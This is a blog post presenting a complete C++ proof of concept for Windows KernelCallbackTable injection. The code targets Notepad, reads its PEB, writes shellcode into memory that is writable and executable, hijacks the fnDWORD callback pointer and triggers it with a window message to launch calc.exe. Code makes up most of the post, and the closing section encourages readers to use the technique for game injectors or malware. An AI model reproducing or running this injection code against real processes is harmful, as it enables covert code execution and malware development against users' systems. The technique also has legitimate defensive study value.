---
layout: post
comments: true
title : "Arbitrary Remote Process Code Execution Using KernelCallbackTable"
---

## Some Information About Technique
Recently I was researching new code execution techniques to use in my own projects and I came across the KernelCallbackTable injection technique.

This technique, which is usually used in malware production, allows us to inject our own malicious shellcode into a victim program and manipulate the code flow of this program and run our own malicious codes in the background.

In this article, I will show you how to access the KernelCallbackTable and how you can manipulate it.


When I researched this technique, I saw that it was previously used in malware called [**Lazarus**](https://www.threatdown.com/blog/north-koreas-lazarus-apt-leverages-windows-update-client-github-in-latest-campaign/)  and [**FinSpy**](https://www.microsoft.com/en-us/security/blog/2018/03/01/finfisher-exposed-a-researchers-tale-of-defeating-traps-tricks-and-complex-virtual-machines/).

But I was surprised that such an easy and effective technique is rarely used these days.

### Pros and Cons

Pros
: Easy to use

Cons
: User32.dll must be loaded in victim process to intercept KernelCallbackTable.

The KernelCallbackTable can be found in the Process Environment Block (PEB) and is initialized to an array of graphic functions available to a GUI process once user32. dll is loaded.

### Lets Take a Look at Process Environment Block

```cpp

struct _PEB64
{
    UCHAR InheritedAddressSpace;                                            //0x0
    UCHAR ReadImageFileExecOptions;                                         //0x1
    UCHAR BeingDebugged;                                                    //0x2
    union
    {
        UCHAR BitField;                                                     //0x3
        struct
        {
            UCHAR ImageUsesLargePages:1;                                    //0x3
            UCHAR IsProtectedProcess:1;                                     //0x3
            UCHAR IsImageDynamicallyRelocated:1;                            //0x3
            UCHAR SkipPatchingUser32Forwarders:1;                           //0x3
            UCHAR IsPackagedProcess:1;                                      //0x3
            UCHAR IsAppContainer:1;                                         //0x3
            UCHAR IsProtectedProcessLight:1;                                //0x3
            UCHAR IsLongPathAwareProcess:1;                                 //0x3
        };
    };
    UCHAR Padding0[4];                                                      //0x4
    ULONGLONG Mutant;                                                       //0x8
    ULONGLONG ImageBaseAddress;                                             //0x10
    ULONGLONG Ldr;                                                          //0x18
    ULONGLONG ProcessParameters;                                            //0x20
    ULONGLONG SubSystemData;                                                //0x28
    ULONGLONG ProcessHeap;                                                  //0x30
    ULONGLONG FastPebLock;                                                  //0x38
    ULONGLONG AtlThunkSListPtr;                                             //0x40
    ULONGLONG IFEOKey;                                                      //0x48
    union
    {
        ULONG CrossProcessFlags;                                            //0x50
        struct
        {
            ULONG ProcessInJob:1;                                           //0x50
            ULONG ProcessInitializing:1;                                    //0x50
            ULONG ProcessUsingVEH:1;                                        //0x50
            ULONG ProcessUsingVCH:1;                                        //0x50
            ULONG ProcessUsingFTH:1;                                        //0x50
            ULONG ProcessPreviouslyThrottled:1;                             //0x50
            ULONG ProcessCurrentlyThrottled:1;                              //0x50
            ULONG ProcessImagesHotPatched:1;                                //0x50
            ULONG ReservedBits0:24;                                         //0x50
        };
    };
    UCHAR Padding1[4];                                                      //0x54
    union
    {
        ULONGLONG KernelCallbackTable;                                      //0x58
        ULONGLONG UserSharedInfoPtr;                                        //0x58
    };

    // strimmed
```

According to [**Vergilius**](https://www.vergiliusproject.com/kernels/x64/windows-11/23h2/_PEB64) KernelCallbackTable is located at PEB + 0x58 

This table provides us any array of graphic functions which we can replace. These functions are executed once their corresponding message is processed.

For example on my PoC I will target the function `fnDWORD` inside this array. `fnDWORD` is typically used to handle messages that pass or require a `DWORD` value as part of their message parameters. Many Windows messages include or rely on `DWORD` values. For example, messages like `WM_GETTEXTLENGTH`, `WM_COMMAND`, and others use or expect `DWORD` as part of their parameters, either in `WPARAM` or `LPARAM`. I will use `WM_COMMAND` message since `WPARAM` could be treated as a `DWORD` value according to MSDN because `WM_COMMAND` message's `WPARAM` is divided into 2 `WORD` parts. See [**MSDN Remarks**](https://learn.microsoft.com/en-us/windows/win32/menurc/wm-command#remarks) 

## PoC

In my PoC, I will target `notepad.exe`. First I will open a handle to victim process with `PROCESS_QUERY_INFORMATION` and with that handle I will call `NtQueryInformationProcess` to retrieve PEB address from `PROCESS_BASIC_INFORMATION` structure. From this PEB struct I will retrieve KernelCallbackTable and in this table I will hook 3rd function which is `fnDWORD`. Then when WM_COMMAND message is processed to victim window it will trigger `fnDWORD` in victim process which will execute my shellcode later.

### Shellcode

My shellcode is responsible for calling CreateProcessA and launching calculator.exe. I like the way I'm mapping my shellcode because it's a cleaner and more reliable way to execute a payload on a remote target. However, you can't pass arguments directly to the function. You should also map the arguments to the target process and make them accessible to the function, as I did in my proof of concept (PoC)

```cpp
#pragma pack(push, 1)
struct shellcode_args {
	char notepad_path[60];
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	PVOID create_process;
	PVOID wait_for_single_object;
	PVOID closehandle;
	BOOL completed = FALSE;
};
#pragma pack(pop)

#pragma runtime_checks( "", off )
#pragma optimize( "", off )
void shellcode() {
	shellcode_args* args = (shellcode_args*)0xF1F1F1F1F1F1F1F1;

	LPCSTR notepadPath = args->notepad_path;
	create_process_template f1 = create_process_template(args->create_process);
	wait_for_single_object_template f2 = wait_for_single_object_template(args->wait_for_single_object);
	closehandle_template f3 = closehandle_template(args->closehandle);

	f1(notepadPath, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &args->si, &args->pi);

	f2(args->pi.hProcess, INFINITE);
	args->completed = TRUE;
	f3(args->pi.hProcess);
	f3(args->pi.hThread);
	return;
};
void shellcode_end() {  };
#pragma runtime_checks( "", on )
#pragma optimize( "", on )
```
### Retrieving PEB Address of Remote Process

It's a piece of cake as you can do it by calling the Windows API NtQueryInformationProcess.

```cpp
DWORD64 GetRemotePEB(HANDLE handle) {
	HMODULE hNTDLL = GetModuleHandleA("ntdll.dll");

	if (!hNTDLL)
		return 0;

	FARPROC fpNtQueryInformationProcess = GetProcAddress
	(
		hNTDLL,
		"NtQueryInformationProcess"
	);

	if (!fpNtQueryInformationProcess)
		return 0;

	NtQueryInformationProcess ntQueryInformationProcess =
		(NtQueryInformationProcess)fpNtQueryInformationProcess;

	PROCESS_BASIC_INFORMATION* pBasicInfo =
		new PROCESS_BASIC_INFORMATION();

	DWORD dwReturnLength = 0;

	ntQueryInformationProcess
	(
		handle,
		0,
		pBasicInfo,
		sizeof(PROCESS_BASIC_INFORMATION),
		&dwReturnLength
	);

	return DWORD64(pBasicInfo->PebBaseAddress);
}
```

### Dispatching Message to Windows

As I mentioned in my article, I will hook the fnDWORD function from the KernelCallbackTable and send a message of type WM_COMMAND since its wParam can be treated as a DWORD, which will later trigger our payload.

```cpp
DWORD victim_pid{ NULL };

inline BOOL CALLBACK EnumWindowFunc(HWND hwnd, LPARAM param)
{
	DWORD pid = 0;
	GetWindowThreadProcessId(hwnd, &pid);
	if (pid == victim_pid)
	{
		SendMessageTimeoutW(hwnd, WM_NULL, 0, 0, SMTO_NORMAL, 1, nullptr);
		return FALSE;
	}
	return TRUE;
}
```
## Fullcode

I'm first getting remote `PEB` address and calculating my `shellcode` size simply by subtracting `shellcode` address from `shellcode_end` address.

> Whole Program Optimization must be turned off to get the correct shellcode size, as compilers can shift the function location due to optimization.
{: .prompt-warning }

Then I patch my shellcode to give it the ability to read the arguments mapped to the target process. You might also wonder why I passed arguments and function pointers. In assembly language, their addresses can be relative to the RIP pointer, meaning they wouldn’t be the same in the target process, which would result in incorrect function addresses and ultimately lead to a crash. This also applies to local function variables and arguments.

We overcome this issue by patching shellcode and passing the addresses of our mapped arguments/variables in the target process instead.

Later, we trigger a `WM_COMMAND` message in the target process, which calls `fnDWORD` and finally executes our shellcode because we hijacked its pointer in the KernelCallbackTable.

When our shellcode executes, it calls `CreateProcessA` with the given parameters and then sets `args.completed` to `TRUE` to indicate that the job is finished.

In the end, we can restore the `fnDWORD` pointer and free the memory.

```cpp
#include <Windows.h>
#include <stdio.h>

int main()
{

	// retrieve our victim's window handle.
	HWND victim_hwnd = FindWindowA("Notepad", NULL);

	// retrieve our victim's process id.

	GetWindowThreadProcessId(victim_hwnd, &victim_pid);

	// open handle to victim
	HANDLE victim_handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, victim_pid);

	// query victim process to retrieve peb address

	uintptr_t victim_peb = GetRemotePEB(victim_handle);

	// read kernelcallback table address which is at peb + 0x58
	uintptr_t kct_address{ 0 };
	SIZE_T    number_of_bytes_read{ 0 };
	BOOL result = ReadProcessMemory(victim_handle, PVOID(victim_peb + 0x58), &kct_address, sizeof uintptr_t, &number_of_bytes_read);

	if (!result || !kct_address)
	{
		return FALSE;
	}

	// fnDWORD function is located at table 0x10 which is 3rd of the table.

	uintptr_t function_to_hook = kct_address + 0x10;
	uintptr_t org_function;

	ReadProcessMemory(victim_handle, PVOID(function_to_hook), &org_function, 8, &number_of_bytes_read);

	// get size of our shellcode.
	UINT32 shellcode_length = DWORD64(shellcode_end) - DWORD64(shellcode);

	// allocate remote memory for our shellcode and map on it.
	PVOID remote_shellcode = VirtualAllocEx(victim_handle, NULL, shellcode_length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (!remote_shellcode)
	{
		return false;
	}

	// allocate local memory for our shellcode.
	PBYTE local_shellcode = (PBYTE)VirtualAlloc(NULL, shellcode_length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (!local_shellcode)
	{
		return false;
	}

	// prepare our args and map it to victim memory.
	shellcode_args args;
	memset(&args, 0, sizeof shellcode_args);

	const char* path_buffer = "C:\\Windows\\System32\\calc.exe";
	memcpy(args.notepad_path, path_buffer, 60);



	memset(&args.si, 0, sizeof args.si);
	memset(&args.pi, 0, sizeof args.pi);

	args.closehandle = (PVOID)CloseHandle;
	args.create_process = (PVOID)CreateProcessA;
	args.wait_for_single_object = (PVOID)WaitForSingleObject;



	PVOID remote_args = VirtualAllocEx(victim_handle, NULL, sizeof shellcode_args, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	if (!remote_args)
	{
		printf("[ERROR]%X \n", GetLastError());
		return FALSE;
	}
	SIZE_T    number_of_bytes_written{ 0 };
	result = WriteProcessMemory(victim_handle, remote_args, &args, sizeof shellcode_args, &number_of_bytes_written);

	if (!result)
	{
		printf("[ERROR]%X \n", GetLastError());
		return FALSE;
	}

	
	// copy our shellcode to our local buffer and then patch it
	memset(local_shellcode, NULL, shellcode_length);

	
	memcpy(local_shellcode, shellcode, shellcode_length);

	for (size_t i = 0; i < shellcode_length; i++)
	{
		// Write our args address
		if (*(DWORD64*)&(local_shellcode[i]) == 0xF1F1F1F1F1F1F1F1)
		{
			*(DWORD64*)&(local_shellcode[i]) = DWORD64(remote_args);
			break;
		}
	}
	result = WriteProcessMemory(victim_handle, remote_shellcode, local_shellcode, shellcode_length, &number_of_bytes_written);

	if (!result)
	{
		printf("[ERROR]%X \n", GetLastError());
		return FALSE;
	}


	BOOL resp;
	

	DWORD oldP;


	resp = VirtualProtectEx(victim_handle, (PVOID)(function_to_hook), 0x1000, PAGE_READWRITE, &oldP);
	if (!resp)
	{
		printf("[ERROR]%X \n", GetLastError());
		return FALSE;
	}

	Sleep(100);

	resp = WriteProcessMemory(victim_handle, (PVOID)(function_to_hook), &remote_shellcode, sizeof uintptr_t, &number_of_bytes_written);

	if (!resp)
	{
		printf("[ERROR]%X \n", GetLastError());
		return FALSE;
	}
	
	//dispatch window message and trigger our payload
	EnumWindows(EnumWindowFunc, 0);

	// wait for response from our shellcode
	while (!args.completed)
	{
		ReadProcessMemory(victim_handle, remote_args, &args, sizeof(args), &number_of_bytes_read);
	}
	
	//restore pointer
	resp = WriteProcessMemory(victim_handle, (PVOID)(function_to_hook), &org_function, sizeof uintptr_t, &number_of_bytes_written);
	
	printf("Finished.\n");
	
	//free memory
	VirtualFreeEx(victim_handle, remote_args, sizeof shellcode_args, MEM_FREE);
	VirtualFreeEx(victim_handle, remote_shellcode, shellcode_length, MEM_FREE);
	VirtualFree(local_shellcode, shellcode_length, MEM_FREE);
    
	system("pause");
	return TRUE;
}
```

## Demonstration

![Desktop View](/images/poc.gif)

# Conclusion

That's it! That's what I wanted to show you. There's always a vulnerability when you come up with different ideas. Just think outside the box and break your chains. You can use the code execution vulnerability I showed above to do anything you want. You can make an injector for a game you like or you can make a malware.

That's all for now. See you on my next article :wave:

{% if page.comments %} {% include disqus.html %} {% endif %}

